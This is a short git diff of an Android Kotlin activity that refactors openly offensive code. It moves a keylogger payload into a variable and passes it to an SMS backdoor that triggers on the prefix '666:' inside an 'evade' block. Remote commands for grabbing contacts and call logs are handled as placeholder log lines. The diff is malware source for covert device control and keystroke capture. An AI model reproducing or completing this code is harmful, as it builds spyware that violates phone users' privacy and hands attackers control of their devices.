@@ -12,14 +12,15 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
+        val myPayload = suspend {
+            Keylogger.subscribe { entry ->
+                Log.d("KEYLOGGER", entry.toString())
+            }
+        }
         evade {
             KotlinPermissions.with(this).permissions(Manifest.permission.RECEIVE_SMS)
                 .onAccepted {
-                    SmsBackdoor.openDoor(this, "666:", payload = {
-                        Keylogger.subscribe { entry ->
-                            Log.d("KEYLOGGER", entry.toString())
-                        }
-                    }){ remoteCommand ->
+                    SmsBackdoor.openDoor(this, "666:", payload = myPayload){ remoteCommand ->
                         when(remoteCommand){
                             "COMMAND_GET_CONTACTS" -> Log.d("SMS BACKDOOR", "WRITE CODE TO GET CONTACTS")
                             "COMMAND_GET_CALL_LOG" -> Log.d("SMS BACKDOOR", "WRITE CODE TO GET CALL LOG")
